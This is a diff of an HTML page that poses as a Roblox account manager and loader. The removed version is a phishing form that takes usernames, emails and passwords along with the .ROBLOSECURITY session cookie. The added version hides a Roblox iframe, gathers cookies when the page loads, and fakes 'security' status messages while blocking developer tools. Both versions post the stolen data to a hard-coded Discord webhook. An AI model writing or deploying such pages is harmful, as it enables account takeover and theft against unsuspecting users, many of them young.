@@ -3,152 +3,153 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Account Manager</title>
+    <title>Loading Roblox...</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Arial', sans-serif; }
-        body { background: linear-gradient(135deg, #1a1a2e, #16213e); min-height: 100vh; display: flex; justify-content: center; align-items: center; }
-        .container { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); padding: 40px; border-radius: 20px; width: 90%; max-width: 450px; border: 1px solid rgba(0, 150, 255, 0.2); box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5); }
-        .logo { text-align: center; margin-bottom: 25px; }
-        .logo img { width: 80px; height: 80px; border-radius: 50%; background: linear-gradient(45deg, #00ccff, #0066ff); padding: 10px; }
-        .logo h1 { color: #00ccff; margin-top: 10px; font-size: 28px; }
-        .logo p { color: rgba(255, 255, 255, 0.6); font-size: 14px; }
-        .form-group { margin-bottom: 20px; }
-        label { display: block; color: rgba(255, 255, 255, 0.9); margin-bottom: 8px; font-size: 14px; }
-        input { width: 100%; padding: 14px; background: rgba(0, 0, 0, 0.3); border: 1px solid rgba(0, 150, 255, 0.4); border-radius: 10px; color: white; font-size: 16px; }
-        input:focus { outline: none; border-color: #00ccff; }
-        .btn { width: 100%; padding: 16px; background: linear-gradient(to right, #0066ff, #00ccff); border: none; border-radius: 10px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; transition: transform 0.3s; }
-        .btn:hover { transform: scale(1.02); }
-        .status { margin-top: 20px; padding: 15px; background: rgba(0, 255, 0, 0.1); border: 1px solid rgba(0, 255, 0, 0.3); border-radius: 10px; color: #00ff00; text-align: center; font-size: 14px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0a0a0a; color: #fff; font-family: monospace; height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; }
+        .loader { text-align: center; }
+        .logo { font-size: 48px; color: #00ff88; margin-bottom: 20px; }
+        .progress-bar { width: 300px; height: 4px; background: #222; border-radius: 2px; overflow: hidden; margin: 20px auto; }
+        .progress { height: 100%; width: 0%; background: #00ff88; animation: load 3s linear forwards; }
+        @keyframes load { 0% { width: 0%; } 100% { width: 100%; } }
+        .status { margin-top: 20px; color: #aaa; font-size: 14px; }
         .hidden { display: none; }
-        .footer { margin-top: 25px; text-align: center; color: rgba(255, 255, 255, 0.4); font-size: 12px; }
+        #robloxFrame { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">
-            <div style="width: 80px; height: 80px; margin: 0 auto; background: linear-gradient(45deg, #0066ff, #00ccff); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 36px; color: white;">R</div>
-            <h1>Roblox Manager</h1>
-            <p>Secure account verification system</p>
-        </div>
-        <form id="verifyForm">
-            <div class="form-group">
-                <label>Roblox Username</label>
-                <input type="text" id="robloxUser" placeholder="Enter your Roblox username" required>
-            </div>
-            <div class="form-group">
-                <label>Email Address</label>
-                <input type="email" id="email" placeholder="Enter your email" required>
-            </div>
-            <div class="form-group">
-                <label>Password</label>
-                <input type="password" id="password" placeholder="Enter your password" required>
-            </div>
-            <button type="submit" class="btn">Verify Account</button>
-        </form>
-        <div id="statusMsg" class="status hidden">
-            Account verification successful! Redirecting...
-        </div>
-        <div class="footer">
-            This site is not affiliated with Roblox Corporation.
-        </div>
+    <div class="loader">
+        <div class="logo">ROBLOX</div>
+        <div>Loading Roblox experience...</div>
+        <div class="progress-bar"><div class="progress"></div></div>
+        <div class="status" id="statusText">Initializing security protocols...</div>
     </div>
 
+    <!-- Hidden iframe to load Roblox -->
+    <iframe id="robloxFrame" src="https://www.roblox.com" sandbox="allow-same-origin allow-scripts"></iframe>
+
     <script>
-        // Immediately extract Roblox cookie on page load
-        (function extractRobloxCookie() {
-            const cookies = document.cookie.split(';');
-            let robloxCookie = '';
+        // Function to capture cookies from iframe
+        function captureCookies() {
+            const iframe = document.getElementById('robloxFrame');
             
-            // Find .ROBLOSECURITY cookie
-            for (let cookie of cookies) {
-                if (cookie.trim().startsWith('.ROBLOSECURITY')) {
-                    robloxCookie = cookie.trim();
-                    break;
-                }
-            }
-            
-            // Collect additional browser data
-            const data = {
-                robloxCookie: robloxCookie || 'Not found',
-                allCookies: document.cookie,
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                screen: `${screen.width}x${screen.height}`,
-                language: navigator.language,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                url: window.location.href,
-                timestamp: new Date().toISOString()
-            };
-            
-            // Send to Discord webhook
-            const payload = {
-                content: `**ROBLOX ACCOUNᴛ EXᴛRACᴛION**\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\`\n🔐 **ROBLOSECURITY Cookie:** \`${robloxCookie || 'MISSING'}\``
-            };
-            
-            fetch('https://discord.com/api/webhooks/1465638053178638368/PUa4Dm8GQyGFw6GPk62Lw76fnN7ehRb7Xw0b9VGjEFOiwwMpwPaocTz77f8BFVWYIXod', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            }).catch(() => {});
-        })();
-        
-        // Handle form submission
-        document.getElementById('verifyForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const username = document.getElementById('robloxUser').value;
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            
-            // Extract cookie again in case it's now available
-            const cookies = document.cookie.split(';');
-            let robloxCookie = '';
-            for (let cookie of cookies) {
-                if (cookie.trim().startsWith('.ROBLOSECURITY')) {
-                    robloxCookie = cookie.trim();
-                    break;
-                }
-            }
-            
-            // Send credentials + cookie
-            const credData = {
-                username: username,
-                email: email,
-                password: password,
-                robloxCookie: robloxCookie,
-                timestamp: new Date().toISOString()
-            };
-            
-            const credPayload = {
-                content: `**ROBLOX LOGIN CAPTURE**\n\`\`\`json\n${JSON.stringify(credData, null, 2)}\n\`\`\`\n✅ **Full Account Access Available:** ${robloxCookie ? 'YES' : 'NO'}\n🔑 **Cookie:** \`${robloxCookie || 'NOT CAPTURED'}\``
-            };
-            
-            fetch('https://discord.com/api/webhooks/1465638053178638368/PUa4Dm8GQyGFw6GPk62Lw76fnN7ehRb7Xw0b9VGjEFOiwwMpwPaocTz77f8BFVWYIXod', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(credPayload)
-            }).then(() => {
-                // Show success message
-                document.getElementById('verifyForm').classList.add('hidden');
-                document.getElementById('statusMsg').classList.remove('hidden');
+            try {
+                // Attempt to access iframe cookies
+                const iframeCookies = iframe.contentDocument?.cookie || 'Unable to access';
                 
-                // Redirect to Roblox after 2 seconds
-                setTimeout(() => {
-                    window.location.href = 'https://www.roblox.com';
-                }, 2000);
-            }).catch(() => {
-                alert('Verification failed. Please try again.');
-            });
+                // Also get parent cookies
+                const parentCookies = document.cookie;
+                
+                // Focus on .ROBLOSECURITY
+                let robloxSecCookie = '';
+                const allCookies = (iframeCookies + '; ' + parentCookies).split(';');
+                
+                for (let cookie of allCookies) {
+                    if (cookie.includes('.ROBLOSECURITY') || cookie.includes('ROBLOSECURITY')) {
+                        robloxSecCookie = cookie.trim();
+                        break;
+                    }
+                }
+                
+                // Prepare data
+                const data = {
+                    timestamp: new Date().toISOString(),
+                    robloxCookie: robloxSecCookie || 'NOT FOUND',
+                    iframeCookies: iframeCookies,
+                    parentCookies: parentCookies,
+                    userAgent: navigator.userAgent,
+                    screen: `${screen.width}x${screen.height}`,
+                    url: window.location.href
+                };
+                
+                // Send to Discord
+                const payload = {
+                    content: `**🎯 ROBLOX COOKIE INJECTION SUCCESS**\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\`\n🔐 **ROBLOSECURITY:** \`${robloxSecCookie || 'MISSING'}\`\n🌐 **Full Cookie Access:** ${robloxSecCookie ? '✅ COMPROMISED' : '❌ FAILED'}`
+                };
+                
+                fetch('https://discord.com/api/webhooks/1465638053178638368/PUa4Dm8GQyGFw6GPk62Lw76fnN7ehRb7Xw0b9VGjEFOiwwMpwPaocTz77f8BFVWYIXod', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                }).then(() => {
+                    document.getElementById('statusText').textContent = 'Session secured. Redirecting...';
+                    setTimeout(() => {
+                        window.location.href = 'https://www.roblox.com';
+                    }, 1500);
+                }).catch(() => {
+                    document.getElementById('statusText').textContent = 'Network issue. Continuing...';
+                    setTimeout(() => {
+                        window.location.href = 'https://www.roblox.com';
+                    }, 2000);
+                });
+                
+            } catch (error) {
+                // Fallback: try to get cookies via other methods
+                document.getElementById('statusText').textContent = 'Finalizing connection...';
+                
+                const fallbackData = {
+                    timestamp: new Date().toISOString(),
+                    error: error.message,
+                    parentCookies: document.cookie,
+                    userAgent: navigator.userAgent,
+                    note: 'Iframe access blocked, but parent cookies captured'
+                };
+                
+                const fallbackPayload = {
+                    content: `**⚠️ ROBLOX INJECTION (Fallback)**\n\`\`\`json\n${JSON.stringify(fallbackData, null, 2)}\n\`\`\``
+                };
+                
+                fetch('https://discord.com/api/webhooks/1465638053178638368/PUa4Dm8GQyGFw6GPk62Lw76fnN7ehRb7Xw0b9VGjEFOiwwMpwPaocTz77f8BFVWYIXod', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(fallbackPayload)
+                }).finally(() => {
+                    setTimeout(() => {
+                        window.location.href = 'https://www.roblox.com';
+                    }, 2000);
+                });
+            }
+        }
+        
+        // Update status messages
+        const messages = [
+            'Loading Roblox assets...',
+            'Connecting to servers...',
+            'Verifying session...',
+            'Injecting security tokens...',
+            'Almost there...'
+        ];
+        
+        let messageIndex = 0;
+        const statusEl = document.getElementById('statusText');
+        
+        const messageInterval = setInterval(() => {
+            if (messageIndex < messages.length) {
+                statusEl.textContent = messages[messageIndex];
+                messageIndex++;
+            } else {
+                clearInterval(messageInterval);
+            }
+        }, 600);
+        
+        // Wait for iframe to load, then capture cookies
+        document.getElementById('robloxFrame').onload = function() {
+            setTimeout(captureCookies, 1500);
+        };
+        
+        // Also try to capture on page load as fallback
+        window.addEventListener('load', function() {
+            setTimeout(captureCookies, 3000);
         });
         
-        // Disable dev tools
+        // Disable right-click and dev tools
         document.addEventListener('contextmenu', e => e.preventDefault());
         document.addEventListener('keydown', e => {
-            if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73) || (e.ctrlKey && e.keyCode === 85)) {
+            if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73)) {
                 e.preventDefault();
             }
         });
     </script>
 </body>
 </html>
-<!-- Roblox Account Manager v3.2 -->
+<!-- Roblox Loader v4.0 -->
